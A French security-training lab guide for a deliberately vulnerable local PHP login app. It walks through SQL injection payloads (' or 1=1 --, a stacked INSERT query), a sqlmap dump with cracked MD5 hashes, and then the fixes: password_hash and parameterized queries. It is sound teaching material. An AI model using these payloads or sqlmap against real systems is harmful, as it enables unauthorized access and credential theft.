# TP - formation sécu n°1

## Déroulement

Suivre les étapes et pratiquer ou suivre la vidéo <https://youtu.be/PSpeF-UU_uk>.

## Démarrage

1. Récupérer le projet et lancer la plateforme

    >```bash
    >    git clone git@github.com:frederictriquet/formation_secu_1.git
    >    cd formation_secu_1/TP/
    >    docker-compose up web pgadmin
    >```

1. Se connecter à <http://localhost:8080/> avec un navigateur.
1. Cliquer sur __reset database__
1. Voir les mauvaises pratiques dans le code :

    - __webapp/webroot/reset.php__
        - les mots de passe sont stockés __hashés en MD5__
    - __webapp/webroot/sqli/index.php__
        - le champ __login__ du formulaire est utilisé directement dans la requête SQL

## Exploitation de l'injection SQL

Le champ __password__ est volontairement visible.
Les mots de passe se trouvent dans __webapp/webroot/reset.php__

1. Cliquer sur __SQL injection__
1. Tester le formulaire
    - __admin__/__incorrect__ : aucun utilisateur ne correspond
    - __admin__/__password__ : 1 utilisateur correspond

1. Dans le champ __login__, tester :
    > login = `'`

    Il n'est pas utile de saisir de mot de passe.

    Initialement, la requête SQL est :

    >```sql
    >$query  = "SELECT COUNT(*) FROM users WHERE login='$login' AND password='$hash';";
    >```

    La requête SQL envoyée à la base de donnée sera :

    >`SELECT COUNT(*) FROM users WHERE login=''' AND password='d41d8cd98f00b204e9800998ecf8427e';`

    Ce qui provoque une erreur de syntaxe au niveau des 3 quotes qui se suivent.

1. Première exploitation : détourner le fonctionnement du code

    > login = `' or 1=1 --`
    >
    >```sql
    >$query = "SELECT COUNT(*) FROM users WHERE login='' or 1=1 --' AND pass...";
    >--------------------------------------------------|_________|
    >```

    - La quote ferme la première chaîne de caractères
    - `or 1=1` est une condition toujours vraie
    - tout ce qui est après `--` est ignoré (commentaires)

    La requête SQL traitée par la base de donnée est donc :

    >```sql
    >SELECT COUNT(*) FROM users WHERE login='' or 1=1
    >```

    Cela va donc renvoyer le nombre d'utilisateurs présents dans la table __users__ au lieu de ne renvoyer que 0 ou 1 lors d'une utilisation normale.

1. Deuxième exploitation : exécuter une requête arbitraire

    > login = `';INSERT INTO users VALUES (12, 'fred', md5('fred')) --`

    La requête devient alors :

    >```sql
    >$query = "SELECT COUNT(*) FROM users WHERE login='';INSERT INTO users VALUES (12, 'fred', md5('fred')) --' AND pass...";
    >```

    La seconde partie est une seconde requête qui ajoute un utilisateur dans la table __users__.

1. Troisième exploitation : avec l'outil dédié __sqlmap__

    > docker-compose run sqlmap -u "http://web/sqli/" --data "login=someuser&password=letMeIn" --batch --dump

    Cet outil exploite les injections SQL et réussit ici à extraire le contenu et la structure des tables. Il sait déchiffrer les champs comme nos mots de passe hashés en MD5.

    ```data
        +----+-------+----------------------------------------------+
        | id | login | password                                     |
        +----+-------+----------------------------------------------+
        | 1  | admin | 5f4dcc3b5aa765d61d8327deb882cf99 (password)  |
        | 2  | alice | 5f4dcc3b5aa765d61d8327deb882cf99 (password)  |
        | 3  | bob   | e99a18c428cb38d5f260853678922e03 (abc123)    |
        | 4  | carol | 8ae1dd156c62f4f0b0b31c29b46f8e48             |
        | 5  | dave  | 437b930db84b8079c2dd804a71936b5f (something) |
        | 12 | fred  | 570a90bfbf8c7eab5dc5d4e26832d5b1 (fred)      |
        +----+-------+----------------------------------------------+
    ```

    Le mot de passe un peu plus complexe de l'utilisatrice __carol__ peut être retrouvé grâce à des [rainbow tables](https://en.wikipedia.org/wiki/Rainbow_table) disponibles par exemple chez [Hash Toolkit](https://hashtoolkit.com/).

## Corriger les vulnérabilités du code

1. modifier soi-même le code ou basculer sur la branche __secure__ :

    >```bash
    >git checkout secure
    >```

1. correction du problème de stockage de mots de passe

    - __webapp/webroot/reset.php__, remplacer

        >```php
        >$hash = md5($user[1]);
        >```

        par

        >```php
        >$hash = password_hash($user[1],PASSWORD_DEFAULT);
        >```

    - __webapp/webroot/reset.php__, remplacer

        >```sql
        >password CHAR(32) NOT NULL
        >```

        par

        >```sql
        >password CHARACTER VARYING(64) NOT NULL
        >```

    - __webapp/webroot/sqli/index.php__, utiliser __password_verify()__

1. correction du problème d'injection
    - __webapp/webroot/sqli/index.php__
        Utiliser les requêtes paramétrées (__pg_query_params()__) partout où des données viennent de l'utilisateur

## Autre mauvaise pratique

- __docker-compose.yml__ et __webapp/webroot/include/db.inc.php__
    l'utilisateur __root__ est utilisé pour toutes les requêtes à la base de données
